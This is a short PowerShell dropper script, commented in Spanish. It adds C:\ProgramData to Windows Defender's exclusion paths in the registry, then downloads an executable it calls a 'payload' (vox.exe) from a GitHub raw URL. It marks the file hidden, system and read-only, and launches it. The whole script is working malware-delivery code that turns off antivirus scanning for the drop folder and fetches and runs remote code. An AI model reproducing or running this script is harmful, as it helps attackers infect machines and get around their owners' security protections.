# Agregar exclusiones a Windows Defender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData" /d 0 /f /reg:64

# Definir la ruta del archivo, el hash esperado y la URL del payload
$filePath = "C:\ProgramData\vox.exe"
$expectedHash = "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"  # Reemplaza con el hash SHA256 real de tu payload
$url = "https://github.com/scripthelpercode/00scripthelpx/raw/main/vox.exe"

# Verificar y descargar el payload
if (!(Test-Path $filePath) -or ((Get-FileHash $filePath -Algorithm SHA256).Hash -ne $expectedHash)) {
    Remove-Item -Path $filePath -Force
    Invoke-WebRequest -Uri $url -OutFile $filePath
    (Get-Item $filePath).Attributes = 'ReadOnly, Hidden, System'
}

# Ejecutar el payload
Start-Process $filePath